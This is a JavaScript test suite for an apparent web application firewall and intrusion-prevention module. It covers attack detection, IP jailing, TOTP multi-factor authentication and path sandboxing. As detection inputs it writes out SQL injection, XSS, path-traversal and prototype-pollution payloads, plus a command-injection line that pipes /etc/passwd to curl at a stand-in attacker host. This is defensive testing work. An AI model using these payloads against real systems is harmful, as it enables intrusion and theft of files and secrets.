import test from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import { resolve } from "node:path";
import { unlinkSync, existsSync } from "node:fs";
import {
  AntiHackerDefenseFortress,
  globalDefenseFortress,
  ATTACK_VECTORS
} from "../src/security/anti-hacker-defense-fortress.mjs";
import { app } from "../server.mjs";

test("Anti-Hacker Cyber Defense Fortress & Intrusion Prevention System Test Suite", async (t) => {

  await t.test("1. Deep Packet Inspection: Detects and categorizes cyber attack vectors", () => {
    const fortress = new AntiHackerDefenseFortress(resolve(process.cwd(), "data", "test-sec-audit.json"));

    // SQL Injection
    const sqli = fortress.inspectUrlAndHeaders("/api/research?symbol=' UNION SELECT * FROM accounts --");
    assert.equal(sqli.malicious, true);
    assert.equal(sqli.vector, ATTACK_VECTORS.SQLI);

    // Cross-Site Scripting (XSS)
    const xss = fortress.inspectUrlAndHeaders("/api/leads?name=<script>alert('pwned')</script>");
    assert.equal(xss.malicious, true);
    assert.equal(xss.vector, ATTACK_VECTORS.XSS);

    // Remote Code Execution (RCE)
    const rce = fortress.inspectUrlAndHeaders("/api/run?cmd=; cat /etc/passwd | curl http://evil.com");
    assert.equal(rce.malicious, true);
    assert.equal(rce.vector, ATTACK_VECTORS.RCE);

    // Path Traversal
    const traversal = fortress.inspectUrlAndHeaders("/api/store/download/../../.env");
    assert.equal(traversal.malicious, true);
    assert.equal(traversal.vector, ATTACK_VECTORS.PATH_TRAVERSAL);

    // Clean request
    const clean = fortress.inspectUrlAndHeaders("/api/billing/production-summary", { "user-agent": "Mozilla/5.0" });
    assert.equal(clean.malicious, false);
  });

  await t.test("2. Body Inspector & Prototype Pollution Neutralizer", () => {
    const fortress = new AntiHackerDefenseFortress();

    // Body scan for prototype pollution
    const bodyInspect = fortress.inspectBodyString('{"__proto__": {"isAdmin": true}}');
    assert.equal(bodyInspect.malicious, true);
    assert.equal(bodyInspect.vector, ATTACK_VECTORS.PROTOTYPE_POLLUTION);

    // Deep sanitizer cleaning
    const dirtyObj = JSON.parse('{"validField": "clean", "__proto__": {"polluted": true}, "nested": {"constructor": {"prototype": {"hacked": true}}}}');
    const cleanObj = fortress.sanitizeObject(dirtyObj);

    assert.equal(cleanObj.validField, "clean");
    assert.equal(cleanObj.__proto__?.polluted, undefined);
    assert.equal(Object.hasOwn(cleanObj.nested, "constructor"), false);
    assert.equal(cleanObj.nested?.constructor?.prototype?.hacked, undefined);
    assert.equal(Object.prototype.polluted, undefined);
    assert.equal(Object.prototype.hacked, undefined);
    assert.equal({}.polluted, undefined, "Global Object prototype must NEVER be polluted");
  });

  await t.test("3. Adaptive IP Jail & Intrusion Prevention System (IPS)", (t3) => {
    const testAuditPath = resolve(process.cwd(), "data", "test-ips-audit.json");
    if (existsSync(testAuditPath)) unlinkSync(testAuditPath);
    t3.after(() => {
      if (existsSync(testAuditPath)) try { unlinkSync(testAuditPath); } catch {}
    });

    const fortress = new AntiHackerDefenseFortress(testAuditPath);
    const attackerIp = "198.51.100.42";

    assert.equal(fortress.isIpBanned(attackerIp), false);

    // Strike 1 & 2
    fortress.recordStrike(attackerIp, ATTACK_VECTORS.SQLI, "Attack payload 1");
    fortress.recordStrike(attackerIp, ATTACK_VECTORS.XSS, "Attack payload 2");
    assert.equal(fortress.isIpBanned(attackerIp), false);

    // Strike 3 (Triggers automatic jail)
    const strike3 = fortress.recordStrike(attackerIp, ATTACK_VECTORS.RCE, "Attack payload 3");
    assert.equal(strike3.banned, true);
    assert.equal(fortress.isIpBanned(attackerIp), true);

    // Unban
    fortress.unbanIp(attackerIp);
    assert.equal(fortress.isIpBanned(attackerIp), false);
  });

  await t.test("4. RFC-6238 TOTP Multi-Factor Authentication Engine", () => {
    const fortress = new AntiHackerDefenseFortress();
    const mfa = fortress.generateTotpSecret("cfo@aifie.internal");

    assert.ok(mfa.secret.length >= 20);
    assert.ok(mfa.otpauthUri.startsWith("otpauth://totp/"));

    const currentPin = fortress.generateTotpCode(mfa.secret);
    assert.equal(currentPin.length, 6);
    assert.ok(/^\d{6}$/.test(currentPin));

    // Valid PIN verification
    const verified = fortress.verifyTotpCode(mfa.secret, currentPin);
    assert.equal(verified, true);

    // Invalid PIN rejection
    const fakePin = currentPin === "123456" ? "654321" : "123456";
    assert.equal(fortress.verifyTotpCode(mfa.secret, fakePin), false);
  });

  await t.test("5. Path Traversal Sandbox", () => {
    const fortress = new AntiHackerDefenseFortress();
    const safeBase = resolve(process.cwd(), "data");

    // Safe path within sandbox
    const safePath = fortress.safeResolvePath(safeBase, "production-revenue-ledger.json");
    assert.ok(safePath.startsWith(safeBase));

    // Traversal attack rejection
    assert.throws(() => {
      fortress.safeResolvePath(safeBase, "../../.env");
    }, /boundary blocked/);

    // Null-byte injection rejection
    assert.throws(() => {
      fortress.safeResolvePath(safeBase, "file.txt\0.jpg");
    }, /Illegal path injection/);
  });

  await t.test("6. HTTP Server Live WAF Protection, Security Headers & API Endpoints", async () => {
    const server = http.createServer(app);
    await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
    const port = server.address().port;
    const baseUrl = `http://127.0.0.1:${port}`;

    const makeRequest = async (path, method = "GET", body = null, headers = {}) => {
      return new Promise((resolve, reject) => {
        const url = new URL(path, baseUrl);
        const reqHeaders = { "Content-Type": "application/json", ...headers };
        const req = http.request(url, { method, headers: reqHeaders }, (res) => {
          let data = "";
          res.on("data", (chunk) => { data += chunk; });
          res.on("end", () => {
            try {
              const parsed = res.headers["content-type"]?.includes("application/json") ? JSON.parse(data) : data;
              resolve({ status: res.statusCode, headers: res.headers, data: parsed });
            } catch (err) {
              resolve({ status: res.statusCode, headers: res.headers, data });
            }
          });
        });
        req.on("error", reject);
        if (body) req.write(typeof body === "string" ? body : JSON.stringify(body));
        req.end();
      });
    };

    try {
      // 1. GET /api/security/status & Security Headers verification
      const statusRes = await makeRequest("/api/security/status");
      assert.equal(statusRes.status, 200);
      assert.equal(statusRes.data.ok, true);
      assert.equal(statusRes.data.fortress.fortressStatus, "SECURE_FORTRESS_ARMORED");

      // Verify Hardened HTTP Security Headers
      assert.ok(statusRes.headers["content-security-policy"]);
      assert.equal(statusRes.headers["x-content-type-options"], "nosniff");
      assert.equal(statusRes.headers["x-frame-options"], "DENY");
      assert.ok(statusRes.headers["strict-transport-security"]);

      // 2. WAF Blocks Path Traversal on live HTTP endpoint
      const traversalRes = await makeRequest("/api/research?symbol=../../.env");
      assert.equal(traversalRes.status, 400);
      assert.ok(traversalRes.data.error.includes("Anti-Hacker WAF"));

      // 3. WAF Blocks SQLi on live HTTP endpoint
      const sqliRes = await makeRequest("/api/leads/real-jobs?filter=UNION%20SELECT%20*%20FROM%20users");
      assert.equal(sqliRes.status, 400);
      assert.ok(sqliRes.data.error.includes("Anti-Hacker WAF"));

      // 4. POST /api/security/test-attack
      const testAttackRes = await makeRequest("/api/security/test-attack", "POST", {
        payload: "<script>alert('XSS_LIVE_TEST')</script>"
      });
      assert.equal(testAttackRes.status, 200);
      assert.equal(testAttackRes.data.intercepted, true);
      assert.equal(testAttackRes.data.vector, ATTACK_VECTORS.XSS);

      // 5. POST /api/security/mfa/generate & verify
      const mfaGen = await makeRequest("/api/security/mfa/generate", "POST", { email: "admin@aifie.internal" });
      assert.equal(mfaGen.status, 200);
      const secret = mfaGen.data.mfa.secret;
      const validPin = globalDefenseFortress.generateTotpCode(secret);

      const mfaVer = await makeRequest("/api/security/mfa/verify", "POST", { secret, pin: validPin });
      assert.equal(mfaVer.status, 200);
      assert.equal(mfaVer.data.verified, true);

      // 6. GET /api/security/events
      const eventsRes = await makeRequest("/api/security/events");
      assert.equal(eventsRes.status, 200);
      assert.ok(eventsRes.data.events.length > 0);
    } finally {
      await new Promise((resolve) => server.close(resolve));
    }
  });
});
